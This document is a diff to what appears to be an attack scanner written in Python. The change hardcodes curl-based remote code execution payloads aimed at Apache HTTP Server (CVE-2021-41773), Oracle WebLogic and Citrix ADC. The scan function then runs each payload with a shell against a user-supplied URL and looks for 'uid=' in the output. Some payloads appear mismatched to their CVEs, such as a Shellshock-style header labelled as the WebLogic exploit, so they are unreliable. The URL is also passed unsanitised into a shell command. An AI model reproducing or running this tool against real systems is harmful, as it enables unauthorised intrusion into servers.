@@ -27,24 +27,39 @@ if not auth_status.get('authenticated') or 'token' not in auth_status:
 print(colored("✅ Access Granted!", 'green'))
 time.sleep(3)
 
+RCE_PAYLOADS = [
+    {
+        "cve": "CVE-2021-41773",
+        "description": "Apache HTTP Server 2.4.49 Path Traversal and Remote Code Execution",
+        "payload": "curl -X POST --data 'echo; id' http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+    },
+    {
+        "cve": "CVE-2020-14882",
+        "description": "Oracle WebLogic Server RCE",
+        "payload": "curl -X POST -H 'User-Agent: () { :;}; echo; /bin/bash -c \"id\"' http://target/console/images/%252E%252E%252Fconsole.portal"
+    },
+    {
+        "cve": "CVE-2019-19781",
+        "description": "Citrix ADC RCE via Path Traversal",
+        "payload": "curl -k -X POST -d 'nsroot:nsroot' https://target/vpn/../vpns/cfg/smb.conf"
+    }
+]
+
 def show_available_rce_payloads():
     print(colored('📜 Available RCE Payloads:', 'yellow'))
-    with open('rce_payloads.json', 'r') as file:
-        payloads = json.load(file)["payloads"]  # Tambah ["payloads"]
-        for payload in payloads:
-            print(colored(f"- {payload['cve']} - {payload['description']}", 'cyan'))  # Perbaiki kunci
+    for payload in RCE_PAYLOADS:
+        print(colored(f"- {payload['cve']} - {payload['description']}", 'cyan'))
 
 def scan_single_url(url):
-    with open('rce_payloads.json', 'r') as file:
-        payloads = json.load(file)["payloads"]  # Tambah ["payloads"]
-
     print(colored(f'🔍 Scanning {url} for RCE vulnerabilities...', 'yellow'))
 
-    for payload in payloads:
-        print(colored(f"[-] Testing {payload['cve']} - {payload['description']}", 'cyan'))  # Perbaiki kunci
+    for payload in RCE_PAYLOADS:
+        print(colored(f"[-] Testing {payload['cve']} - {payload['description']}", 'cyan'))
+        command = payload['payload'].replace("http://target", url)
+
         try:
-            response = requests.get(url)
-            if payload['payload'] in response.text:  # Perbaiki kunci
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            if "uid=" in result.stdout:
                 print(colored(f"[✅] Vulnerable to {payload['cve']}", 'green'))
             else:
                 print(colored('[❌] Not Vulnerable', 'red'))
@@ -58,6 +73,7 @@ def run_nuclei_scan(target):
 
 def main():
     os.system('cls' if os.name == 'nt' else 'clear')
+
 
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
